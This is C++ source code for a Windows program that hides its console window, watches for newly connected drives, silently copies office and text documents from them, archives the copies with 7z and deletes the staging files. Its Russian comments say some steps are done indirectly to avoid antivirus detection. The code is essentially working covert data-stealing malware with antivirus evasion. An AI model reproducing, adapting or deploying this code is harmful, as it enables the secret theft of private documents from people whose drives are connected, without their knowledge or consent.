#include <time.h>
#include <windows.h>
#include <string>

#include <list>
#include <set>
#include <io.h>
#include <vector>
#include <algorithm>
#include <iostream>
#include <fstream>

#include <fcntl.h>   // open
#include <unistd.h>  // read, write, close
#include <cstdio>    // BUFSIZ
#include <ctime>
#include <string>
#include <shlwapi.h>
#include <sstream>
#include "Alloc.h"
#include "LzmaEnc.h"
#include "LzmaDec.h"


using namespace std;
string allDrives;
char getRemovableDisk();
string fileshit[] = {".txt",".xls",".xlsx",".doc",".docx"};
string pathsuck = "SS/"; //Путь куда копировать


//Удаление через жопу иначе антивирус палит
void my_search(string dir, string mask, unsigned int depth) {
    WIN32_FIND_DATA d;
    if (dir.empty() || mask.empty()) return;
    string path = dir + mask;
    if (path.empty()) return;
    HANDLE h = FindFirstFile(path.c_str(), &d);
    if (!h) return;
    /*ofstream out;
    ofstream logg;
			out.open("log.txt", ios_base::app); //Открываем лог для записи 
			logg.open("del.txt", ios_base::app); //Открываем лог для записи 
   			if (out.is_open()){ // */
    do {
        if (d.cFileName[0] != '.') {
            if (d.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                for (unsigned int j = 0; j < depth; j++) cout << "";
                string new_path = dir + d.cFileName + "\\";
                my_search(new_path, mask, depth + 1);
            } else {
                for (unsigned int j = 0; j < depth; j++) cout << "";
				string full = dir + d.cFileName;
				string filenameshit = pathsuck + d.cFileName;
				
			 	//сюда срать анализ строк     
				for ( int x = 0; x <= 4; x++ ){
					if (full.find(fileshit[x]) != string::npos) {
						//cout << full <<endl;
						
						//Автокопирование
						char *cstr = &filenameshit[0];
						char *jopa = (char*)cstr;
				
    					//std::cout << std::ifstream(jopa).rdbuf() << '\n'; // print file
 
    					std::remove(jopa); // delete file
 
    					bool failed = !std::ifstream(jopa);
						
						//Конец
					}
			   	}
			    //cout << full << endl; //Дебаг фулл пути
            }
        }
    } while(FindNextFile(h, &d));
    //}out.close();logg.close();
}



void stealth() {
HWND stealth;
AllocConsole();
stealth = FindWindowA("consoleWindowClass", NULL);
ShowWindow(stealth, 0);  //1-видим окно, 0-нет
}

//Копирование через жопу иначе антивирус палит
void my_search_tree(string dir, string mask, unsigned int depth) {
    WIN32_FIND_DATA d;
    if (dir.empty() || mask.empty()) return;
    string path = dir + mask;
    if (path.empty()) return;
    HANDLE h = FindFirstFile(path.c_str(), &d);
    if (!h) return;
    /*ofstream out;
    ofstream logg;
			out.open("log.txt", ios_base::app); //Открываем лог для записи 
			logg.open("del.txt", ios_base::app); //Открываем лог для записи 
   			if (out.is_open()){*/
    do {
        if (d.cFileName[0] != '.') {
            if (d.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                for (unsigned int j = 0; j < depth; j++) cout << "";
                string new_path = dir + d.cFileName + "\\";
                my_search_tree(new_path, mask, depth + 1);
            } else {
                for (unsigned int j = 0; j < depth; j++) cout << "";
				string full = dir + d.cFileName;
				string filenameshit = pathsuck + d.cFileName;
				
			 	//сюда анализ строк     
				for ( int x = 0; x <= 4; x++ ){
					if (full.find(fileshit[x]) != string::npos) {
						//out << full <<endl;
						
						//Автокопирование
						char *cstr = &full[0];
						char *jopa = (char*)cstr;
						char *chac = &filenameshit[0];
						char *chacha = (char*)chac;
						ifstream in(jopa, ios::in | ios::binary);
						ofstream out(chacha, ios::out | ios::binary);
						  //Дебаг
						if (!in){
						    cout << "[ERROR] Cannot find: " << d.cFileName <<endl;
						    //system("pause");
						    
						}
						if (!out) {
						    cout << "[ERROR] Cannot create: " << d.cFileName << endl;
						    //system("pause");
						    
						}
						    char ch; //запись
						while (in) {
    						in.get(ch);
    						if (in) out.put(ch);
						}
						//logg << "SS\\" << d.cFileName <<endl; 
						in.close(); 
						out.close();
						
					/*string bruh = "copy \"" +  full + "\" \"SS\\" + d.cFileName + "\" >nul";
					char bruhbruh[bruh.size()+1];
					strcpy(bruhbruh, bruh.c_str());
					cout << bruhbruh <<endl;
					//Sleep(100);
					system(bruhbruh);*/
					
						//Конец
					}
			   	}
			    //cout << full << endl; //Дебаг фулл пути
            }
        }
    } while(FindNextFile(h, &d));
    //}out.close();logg.close();
}

int main(void){
	
	stealth(); //НЕ ЗАБУДЬ ВКЛЮЧИТЬ
	
	setlocale(LC_ALL, "Russian");
    char driveLetter = getRemovableDisk(); // Вообще лучше сделать массивом ака CHAR
    while(1){
        driveLetter = getRemovableDisk(); //пофиксить
        if(driveLetter!='0'){
        	printf("\n New USB detected!");
            printf("\n Letter: %c", driveLetter); //вывод буковы подключенного устройства. Если массив то фикс на %c
            //cout << driveLetter[0] << endl; 
            //printf("\n %p", &driveLetter); //адрес char 
            //главный код
            //Костыляем до "Диск:\\"
            char dd[4]; 
            dd[0] = driveLetter;
            dd[1] = ':';
            dd[2] = '\\';
            dd[3] = '\0';
            
            //Аккуратно, тут пипец
           	unsigned __int64 i64FreeBytesToCaller,i64TotalBytes, i64FreeBytes; //Назначаем диапазоны
            BOOL  fResult; //Булим лоха
            DWORD dwSectPerClust,dwBytesPerSect, dwFreeClusters,dwTotalClusters; //оно же int 
            typedef BOOL (WINAPI *P_GDFSE)(LPCTSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER); //Создаём псевдоним для значения bool
            P_GDFSE pGetDiskFreeSpaceEx = NULL; //Без этого не работает
            pGetDiskFreeSpaceEx = (P_GDFSE)GetProcAddress(GetModuleHandle ("Lkernel32.dll"), "GetDiskFreeSpaceExW"); //Объявляем расширенную GetDiskFreeSpaceEx 
			if (pGetDiskFreeSpaceEx){ //Если всё ок
				fResult = pGetDiskFreeSpaceEx((LPCTSTR)dd, (PULARGE_INTEGER)&i64FreeBytesToCaller,(PULARGE_INTEGER)&i64TotalBytes, (PULARGE_INTEGER)&i64FreeBytes); //Лог здорового человека
					if (fResult){ //64 бит матеша с фулл данными с байтов до мегабайтов
					printf("\nAvailable space to caller = %I64u MB", i64FreeBytesToCaller/(1024*1024));
					printf("\nTotal space               = %I64u MB", i64TotalBytes/(1024*1024));
					printf("\nFree space on drive       = %I64u MB", i64FreeBytes/(1024*1024));
				}
			}else{ //Если не ок
				fResult = GetDiskFreeSpace((LPCSTR)dd, &dwSectPerClust, &dwBytesPerSect, &dwFreeClusters, &dwTotalClusters); //Лог курильщика
					if (fResult){ //64 бит матеша с фулл данными с байтов до мегабайтов
						printf("\nUsing force math");
					i64TotalBytes = (__int64)dwTotalClusters * dwSectPerClust * dwBytesPerSect;
					i64FreeBytes = (__int64)dwFreeClusters * dwSectPerClust * dwBytesPerSect;
					printf("\nFree space  = %I64u MB", i64FreeBytes/(1024*1024));
					printf("\nTotal space = %I64u MB", i64TotalBytes/(1024*1024));
					}
				}
				   
				   
           printf("\n Drivetype: "); //определяем тип диска, позже сделаю лог-файл
            switch ( GetDriveType( dd ) ) {
            case DRIVE_UNKNOWN:
                printf("Unknown. Fuck you, leatherman");             
                break;

            case DRIVE_NO_ROOT_DIR:
                printf("No dir. Fuck you, leatherman");
                break;

            case DRIVE_REMOVABLE:
                printf("Removable disk (USB)");
                printf("\nScanning... \n");
                my_search_tree(dd, "*.*", 0);
                break;

            case DRIVE_FIXED:
                printf("HDD ");
                printf("\nScanning... \n");
                my_search_tree(dd, "*.*", 0);
                break;

            case DRIVE_REMOTE:
                printf("Netdisk");
                printf("\nScanning... \n");
                my_search_tree(dd, "*.*", 0);
                break;

            case DRIVE_CDROM:
                printf("CD  DVD");
                printf("\nScanning... \n");
                my_search_tree(dd, "*.*", 0);
                break;

            case DRIVE_RAMDISK:
                printf("RAM-DISK");
                printf("\nScanning... \n");
                my_search_tree(dd, "*.*", 0);
                break;

            default: ;
            }
            
            
            //Поиск файлов
            
        	/*ofstream out;
			out.open("log.txt");
   			if (out.is_open()){out << "";}out.close(); //Чистим лог
   			*/
   			
   			//system("pause");
   			
   			cout << "\n making archive" << endl;
   			
   			time_t now = time(0);

stringstream sss ;
sss << now ;
string fullFile;
sss >> fullFile;

string bruhhs = "7z.exe a ZS\\" +  fullFile + ".7z SS";

   	char *cstrs = &bruhhs[0];
	char *jopapopa = (char*)cstrs;
						
   system(jopapopa);
   
			cout << "\n deleting... " << endl;
   			my_search("SS/", "*.*", 0);
   			
   			cout << "\n end" << endl;
        	//system("pause");
            
        }
        Sleep(1000);
    }
    return 0;
}

char getRemovableDisk(){
    char drive='0';
    char szLogicalDrives[MAX_PATH];
    int dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives); //32 бита. Если не работает - фикс на DWORD
    string currentDrives="";
    //printf("%c", dwResult);
    for(int i=0; i<dwResult; i++) //Магия с массивом дисков
    {
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90)
        {
            currentDrives.append(1, szLogicalDrives[i]);
            if(allDrives.find(szLogicalDrives[i]) > 100)
            {
                drive = szLogicalDrives[i];    
                printf("\nStatic disk found: %c", drive);  //дебаг массива
            }
        }
    }
    allDrives = currentDrives;
    return drive;
}

